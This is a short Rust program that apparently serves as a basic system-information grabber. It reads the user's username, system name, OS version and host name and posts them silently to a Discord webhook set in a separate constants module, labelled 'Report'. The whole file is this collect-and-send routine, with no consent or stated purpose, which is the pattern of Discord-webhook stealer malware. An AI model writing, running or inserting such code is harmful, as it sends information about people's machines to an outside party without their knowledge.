use anyhow::Result;
use serenity::{
    http::Http,
    model::{
        channel::Embed,
        webhook::Webhook,
    },
};
use std::env;
use sysinfo::{System, SystemExt};

mod consts;

#[tokio::main]
async fn main() {

    let sys = System::new_all();
    let mut sysinfo = String::new();
    sysinfo.push_str(&format!(
        "Username:                {}\n",
        env::var_os("USERNAME").unwrap().into_string().unwrap()
    ));
    sysinfo.push_str(&format!(
        "System name:             {}\n",
        unwrap_string(sys.name())
    ));
    sysinfo.push_str(&format!(
        "System OS version:       {}\n",
        unwrap_string(sys.os_version())
    ));
    sysinfo.push_str(&format!(
        "System host name:        {}\n",
        unwrap_string(sys.host_name())
    ));

    send(sysinfo).await.unwrap();
}

async fn send(data: String) -> Result<()> {
    let http = Http::new("token");
    let url = consts::WEBHOOK;

    // Create webhook.
    let webhook = Webhook::from_url(&http, url).await?;

    // Embed [data] in a discord message.
    let embed = Embed::fake(|e| {
        e.title("System info");
        e.description(data);
        e
    });

    // Execute webhook
    webhook
        .execute(&http, true, |w| {
            w.username("Report")
                .embeds(vec![embed]);
            w
        })
        .await?;
    Ok(())
}

pub fn unwrap_string(info: Option<String>) -> String {
    match info {
        Some(s) => s,
        None => "?".to_string(),
    }
}